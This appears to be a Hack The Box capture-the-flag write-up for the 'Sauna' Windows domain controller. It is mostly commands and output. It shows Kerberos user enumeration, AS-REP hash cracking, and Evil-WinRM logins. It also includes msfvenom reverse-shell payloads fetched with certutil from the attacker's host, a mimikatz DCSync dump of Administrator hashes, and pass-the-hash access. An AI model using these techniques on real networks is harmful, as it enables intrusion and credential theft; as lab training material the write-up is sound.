# Sauna

URL: https://app.hackthebox.com/machines/Sauna

Level: Easy

Date 17 Jul 2020

## Walkthrough

- [Enumeration](#enumeration)
- [User flag](#user-flag)
- [Privesc](#privesc)

## NMAP

We run `nmap` and we found lots of open ports.

We focus on 88/TCP (kerberos).

We try to enumerate users, with this list:

https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt

N.B. Domain is "EGOTISTICAL-BANK.LOCAL" without the trailing "0"

```
msf5 auxiliary(gather/kerberos_enumusers) > set USER_FILE /opt/htb/Sauna/top-usernames-shortlist.txt
USER_FILE => /opt/htb/Sauna/top-usernames-shortlist.txt
msf5 auxiliary(gather/kerberos_enumusers) > set DOMAIN EGOTISTICAL-BANK.LOCAL
DOMAIN => EGOTISTICAL-BANK.LOCAL
```

We got a match with `administrator`:

```
[+] 10.10.10.175:88 - User: "administrator" is present
```

We generate a list of username (from website):

```
f.smith
s.coins
s.driver
b.taylor
h.bear
s.kerb
fsmith
scoins
sdriver
btaylor
hbear
skerb
fergussmith
shauncoins
sophiedriver
bowietaylor
hugobear
stevenkerb
```

Website says "so many bank acount managers but only one security manager. sounds about right"

We try to retrieve some hash with our userlist:

```
root@kali:/opt/impacket/build/scripts-2.7# ./GetNPUsers.py   -usersfile /opt/htb/Sauna/sauna_users -dc-ip 10.10.10.175  -outputfile /opt/htb/Sauna/output_hashes -k EGOTISTICAL-BANK.LOCAL/
Impacket v0.9.22.dev1+20200428.191254.96c7a512 - Copyright 2020 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

We get a result:

```
root@kali:/opt/impacket/build/scripts-2.7# cat /opt/htb/Sauna/output_hashes
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:da2850ddf5b666b94b9b9da907405297$8165c35ae89b483347817022df3e412bea13bbbd4deb6e0b2ce22b8b736894489f33cb86a65a4a4530c39c94e37c80cadcb4b0a19e7a3efb71d4460b01b54620d8a0d297e21133318368a741f075a37248a6e84eb155deb55582117e18730643dd9e5a3d289fef5482e1894bcd3ef80cc718b05ee47b605e1873bcc5558576d90076230c5deb04252c11dd5498badf5d49270ffb09dd6bd5a328e9530d7038de3770c30fb91d19b625a375457383d4efd912d4e41be73cc46b571c7644b097a42fbf1f70c27f1d41c89d22104dac138f5642a0f2916d3e4a9ee9638d9ca81c060fb29757a4896302872f5ea4540f39df92513982c543c3c55632cbf3280d8504
```

Let's crack with JohnTheRipper:

```
root@kali:/opt/htb/Sauna# john --wordlist=/usr/share/wordlists/rockyou.txt output_hashes
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:32 36.35% (ETA: 22:57:35) 0g/s 167267p/s 167267c/s 167267C/s mr2509..mr23sgte
0g 0:00:00:34 38.76% (ETA: 22:57:34) 0g/s 167287p/s 167287c/s 167287C/s mbn8670..mbn1234
0g 0:00:00:37 42.41% (ETA: 22:57:34) 0g/s 167253p/s 167253c/s 167253C/s lilsammib..lilsam31
0g 0:00:00:47 54.34% (ETA: 22:57:33) 0g/s 167193p/s 167193c/s 167193C/s gkpb16..gkougkoularas83
0g 0:00:01:03 73.56% (ETA: 22:57:32) 0g/s 167249p/s 167249c/s 167249C/s This email address is registered already..Thirdbase27
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
1g 0:00:01:03 DONE (2020-07-10 22:57) 0.01586g/s 167200p/s 167200c/s 167200C/s ThetaNuTheta..Thessa1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Now we use `evil-winrm` (ref. https://github.com/Hackplayers/evil-winrm)

```
gem install evil-winrm
```

We obatin a shell

```
root@kali:~# evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents>

*Evil-WinRM* PS C:\Users\FSmith\Documents>
*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith
*Evil-WinRM* PS C:\Users\FSmith\Documents>
```

Now we try to upgrade our shell with `meterpreter`:

```
root@kali:/opt/htb/Sauna# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.44 LPORT=4444 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
```

We spawn our python webserver and we transfer our payload:

```
*Evil-WinRM* PS C:\Users\FSmith\Documents> certutil -urlcache -f http://10.10.14.44/shell.exe c:\Users\FSmith\Documents\shell.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\Users\FSmith\Documents> dir


    Directory: C:\Users\FSmith\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/13/2020   8:37 PM          73802 shell.exe
```


## Meterpreter shell

```
meterpreter > getuid
Server username: EGOTISTICALBANK\FSmith
meterpreter > systeminfo
[-] Unknown command: systeminfo.
meterpreter > sysinfo
Computer        : SAUNA
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Meterpreter     : x86/windows
```

## Suggester

```
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


msf5 exploit(multi/handler) > use 0
msf5 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.175 - Collecting local exploits for x86/windows...
```

# User-flag

We are able to retrieve user flag.

# Privesc

```
wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/obj/x64/Release/winPEAS.exe
```

```
python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...

10.10.10.175 - - [17/Jul/2020 21:49:26] "GET /rofl.exe HTTP/1.1" 200 -
10.10.10.175 - - [17/Jul/2020 21:49:27] "GET /rofl.exe HTTP/1.1" 200 -
```

```
*Evil-WinRM* PS C:\Users\FSmith\Desktop> certutil -urlcache -f http://10.10.14.22/rofl.exe c:\Users\FSmith\Documents\rofl.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

We run `winPEAS` and we found something interesting:

```
[+] Looking for AutoLogon credentials(T1012)
Some AutoLogon credentials were found!!
DefaultDomainName             :  EGOTISTICALBANK
DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
DefaultPassword               :  Moneymakestheworldgoround!
```

```
*Evil-WinRM* PS C:\Users\svc_loanmgr> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
The command completed with one or more errors.
```

Other findings:

```
[+] Looking for possible password files in users homes(T1083&T1081)
[?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml

  [+] Looking for common SAM & SYSTEM backups()
    C:\Windows\System32\config\RegBack\SAM
    C:\Windows\System32\config\RegBack\SYSTEM

  [+] Looking AppCmd.exe()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
    AppCmd.exe was found in C:\Windows\system32\inetsrv\appcmd.exe You should try to search for credentials
```

Then we access with `evil-wimrm` and new credentials:

```
root@kali:/opt/htb/Sauna# evil-winrm -i 10.10.10.175 -u svc_loanmgr -p Moneymakestheworldgoround!

Evil-WinRM shell v2.3
```

We generate a meterpreter reverse shell 64bit:

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.22 LPORT=4444 -f exe > shell.exe
```

We transfer it through `certutil`

We run `multi/handler` with msfconsole:

```
msf5 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.22      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.22:4444
[*] Sending stage (201283 bytes) to 10.10.10.175
[*] Meterpreter session 8 opened (10.10.14.22:4444 -> 10.10.10.175:60157) at 2020-07-17 22:46:02 +0200
```
We transfer `mimikatz` with python webserver:

https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200715

```
    *Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> certutil -urlcache -f http://10.10.14.22/mimicat.exe c:\Users\svc_loanmgr\Documents\mimicat.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```


We dump LSA:

```
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> ./mimicat.exe "lsadump::dcsync /user:administrator" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 15 2020 16:10:52
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync /user:administrator
[DC] 'EGOTISTICAL-BANK.LOCAL' will be the domain
[DC] 'SAUNA.EGOTISTICAL-BANK.LOCAL' will be the DC server
[DC] 'administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 1/24/2020 10:14:15 AM
Object Security ID   : S-1-5-21-2966785786-3096785034-1186376766-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f
    lm  - 0: ee8c50e6bc332970a8e8a632488f5211

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : caab2b641b39e342e0bdfcd150b1683e

* Primary:Kerberos-Newer-Keys *
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
      aes128_hmac       (4096) : 145e4d0e4a6600b7ec0ece74997651d0
      des_cbc_md5       (4096) : 19d5f15d689b1ce5
    OldCredentials
      aes256_hmac       (4096) : 9637f48fa06f6eea485d26cd297076c5507877df32e4a47497f360106b3c95ef
      aes128_hmac       (4096) : 52c02b864f61f427d6ed0b22639849df
      des_cbc_md5       (4096) : d9379d13f7c15d1c

* Primary:Kerberos *
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Credentials
      des_cbc_md5       : 19d5f15d689b1ce5
    OldCredentials
      des_cbc_md5       : d9379d13f7c15d1c

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  3fbea1ff422da035f1dc9b0ce45e84ea
    02  708091daa9db25abbd1d94246e4257e2
    03  417f2e40d5be8d436af749ed9fddb0b0
    04  3fbea1ff422da035f1dc9b0ce45e84ea
    05  50cb7cfb64edf83218804d934e30d431
    06  781dbcf7b8f9079382a1948f26f561ee
    07  4052111530264023a7d445957f5146e6
    08  8f4bffc5d94cc294272cd0c836e15c47
    09  0c81bc892ea87f7dd0f4a3a05b51f158
    10  f8c10a5bd37ea2568976d47ef12e55b9
    11  8f4bffc5d94cc294272cd0c836e15c47
    12  023b04503e3eef421de2fcaf8ba1297d
    13  613839caf0cf709da25991e2e5cb63cf
    14  16974c015c9905fb27e55a52dc14dfb0
    15  3c8af7ccd5e9bd131849990d6f18954b
    16  2b26fb63dcbf03fe68b67cdd2c72b6e6
    17  6eeda5f64e4adef4c299717eafbd2850
    18  3b32ec94978feeac76ba92b312114e2c
    19  b25058bc1ebfcac10605d39f65bff67f
    20  89e75cc6957728117eb1192e739e5235
    21  7e6d891c956f186006f07f15719a8a4e
    22  a2cada693715ecc5725a235d3439e6a2
    23  79e1db34d98ccd050b493138a3591683
    24  1f29ace4f232ebce1a60a48a45593205
    25  9233c8df5a28ee96900cc8b59a731923
    26  08c02557056f293aab47eccf1186c100
    27  695caa49e68da1ae78c1523b3442e230
    28  57d7b68bd2f06eae3ba10ca342e62a78
    29  3f14bb208435674e6a1cb8a957478c18
```

Now we can access again with `evil-winmr` has NTLM hash:

```
Credentials:
  Hash NTLM: d9485863c1e9e05851aa40cbb4ab9dff <---------- questo
```

```
root@kali:/opt/htb/Sauna# evil-winrm -i 10.10.10.175 -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/23/2020  10:22 AM             32 root.txt
```
